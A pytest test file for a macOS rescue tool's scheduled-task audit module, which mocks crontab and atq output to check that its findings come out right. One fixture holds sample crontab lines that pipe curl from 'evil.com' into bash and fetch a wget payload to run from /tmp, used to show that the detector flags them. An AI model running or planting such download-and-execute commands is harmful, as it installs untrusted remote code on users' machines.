import sys
from pathlib import Path
from unittest.mock import patch, MagicMock
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from rescue.models import SystemProfile, Platform, Severity, RiskLevel, Mode
from rescue.registry import discover_modules


def _make_profile():
    return SystemProfile(
        platform=Platform.DARWIN,
        os_name="macOS",
        os_version="15.2",
        architecture="arm64",
        cpu_model="Apple M2",
        cpu_cores=8,
        ram_bytes=16 * 1024**3,
    )


def _get_module():
    modules_dir = Path(__file__).parent.parent / "modules"
    modules = discover_modules(modules_dir)
    return next(m for m in modules if m.name == "scheduled_tasks_audit")


def _make_subprocess_result(stdout="", stderr="", returncode=0):
    result = MagicMock()
    result.stdout = stdout
    result.stderr = stderr
    result.returncode = returncode
    return result


def _fake_clean_crontab():
    """Normal case: no crontab"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list):
            cmd_str = " ".join(cmd)
        else:
            cmd_str = cmd

        if "crontab -l" in cmd_str:
            # No crontab
            return _make_subprocess_result("", "no crontab for root", 1)
        elif "atq" in cmd_str:
            # No at jobs
            return _make_subprocess_result("", "", 0)

        return _make_subprocess_result()
    return fake_run


def _fake_healthy_crontab():
    """Case with legitimate crontab entries"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list):
            cmd_str = " ".join(cmd)
        else:
            cmd_str = cmd

        if "crontab -l" in cmd_str:
            return _make_subprocess_result(
                "0 9 * * * /usr/local/bin/backup.sh\n"
                "0 12 * * * /usr/bin/python3 /opt/check_mail.py\n"
            )
        elif "atq" in cmd_str:
            # No at jobs
            return _make_subprocess_result("", "", 0)

        return _make_subprocess_result()
    return fake_run


def _fake_suspicious_curl_crontab():
    """Case with curl/wget downloading remote content"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list):
            cmd_str = " ".join(cmd)
        else:
            cmd_str = cmd

        if "crontab -l" in cmd_str:
            return _make_subprocess_result(
                "0 * * * * curl http://evil.com/malware.sh | bash\n"
                "0 9 * * * /usr/local/bin/backup.sh\n"
                "30 */2 * * * wget -q http://malicious.site/payload -O /tmp/p && /tmp/p\n"
            )
        elif "atq" in cmd_str:
            return _make_subprocess_result("", "", 0)

        return _make_subprocess_result()
    return fake_run


def _fake_with_at_jobs():
    """Case with at jobs"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list):
            cmd_str = " ".join(cmd)
        else:
            cmd_str = cmd

        if "crontab -l" in cmd_str:
            return _make_subprocess_result(
                "0 9 * * * /usr/local/bin/backup.sh\n"
            )
        elif "atq" in cmd_str:
            return _make_subprocess_result(
                "5    Mon Jul  7 15:00:00 2026 a root\n"
                "6    Tue Jul  8 10:30:00 2026 a testuser\n"
            )

        return _make_subprocess_result()
    return fake_run


def _fake_var_at_tabs():
    """Case with entries in /var/at/tabs/"""
    def fake_run(cmd, **kwargs):
        if isinstance(cmd, list):
            cmd_str = " ".join(cmd)
        else:
            cmd_str = cmd

        if "crontab -l" in cmd_str:
            return _make_subprocess_result("", "no crontab", 1)
        elif "atq" in cmd_str:
            return _make_subprocess_result("", "", 0)

        return _make_subprocess_result()
    return fake_run


def test_scheduled_tasks_audit_discovered():
    mod = _get_module()
    assert mod.name == "scheduled_tasks_audit"
    assert mod.category == "security"
    assert mod.risk_level == RiskLevel.SAFE


def test_scheduled_tasks_audit_clean():
    """Test with no crontab and no at jobs"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_clean_crontab()):
        result = mod.check(_make_profile())

    assert result.has_issues  # Should have INFO findings for clean state
    # Should have INFO findings saying no crontab and no at jobs
    assert any(
        f.severity == Severity.INFO
        and "no user crontab" in f.title.lower()
        for f in result.findings
    )
    assert any(
        f.severity == Severity.INFO
        and "no at jobs" in f.title.lower()
        for f in result.findings
    )


def test_scheduled_tasks_audit_healthy_crontab():
    """Test with legitimate crontab entries"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_healthy_crontab()):
        result = mod.check(_make_profile())

    assert result.has_issues
    # Should have INFO findings for each crontab entry
    assert any(
        f.severity == Severity.INFO
        and "crontab entry found" in f.title.lower()
        for f in result.findings
    )
    # Should not have any WARNING findings
    assert not any(
        f.severity == Severity.WARNING
        for f in result.findings
    )


def test_scheduled_tasks_audit_suspicious_curl():
    """Test with curl/wget downloading remote content"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
        result = mod.check(_make_profile())

    assert result.has_issues
    # Should have WARNING for curl downloading remote content
    assert any(
        f.severity == Severity.WARNING
        and "downloads or executes remote content" in f.description.lower()
        and f.data.get("check") == "remote_content_in_crontab"
        for f in result.findings
    )
    # Should also have INFO for the backup crontab
    assert any(
        f.severity == Severity.INFO
        and "crontab entry found" in f.title.lower()
        for f in result.findings
    )


def test_scheduled_tasks_audit_with_at_jobs():
    """Test with at jobs"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_with_at_jobs()):
        result = mod.check(_make_profile())

    assert result.has_issues
    # Should have INFO findings for at jobs
    assert any(
        f.severity == Severity.INFO
        and "at job found" in f.title.lower()
        and f.data.get("check") == "at_job_info"
        for f in result.findings
    )


def test_scheduled_tasks_audit_fix_is_informational():
    """Test that fix() returns informational actions"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
        check = mod.check(_make_profile())
        fix = mod.fix(check, Mode.MANUAL)

    # fix() should always succeed with informational messages
    assert fix.all_succeeded
    # Should have at least one action
    assert len(fix.actions) > 0
    # All actions should succeed
    for action in fix.actions:
        assert action.success
        assert action.risk_level == RiskLevel.SAFE


def test_scheduled_tasks_audit_fix_remote_content():
    """Test fix() response for remote content warnings"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_suspicious_curl_crontab()):
        check = mod.check(_make_profile())
        fix = mod.fix(check, Mode.MANUAL)

    # Should have action for reviewing suspicious crontab entry
    assert any(
        "remote content" in a.title.lower()
        or "suspicious" in a.title.lower()
        for a in fix.actions
    )


def test_scheduled_tasks_audit_var_at_tabs_no_permission():
    """Test /var/at/tabs scanning with no permission errors handled gracefully"""
    mod = _get_module()
    with patch("subprocess.run", side_effect=_fake_var_at_tabs()):
        with patch("pathlib.Path.iterdir", side_effect=PermissionError()):
            # Should handle permission errors gracefully
            result = mod.check(_make_profile())
    # Should still have basic findings
    assert result.has_issues
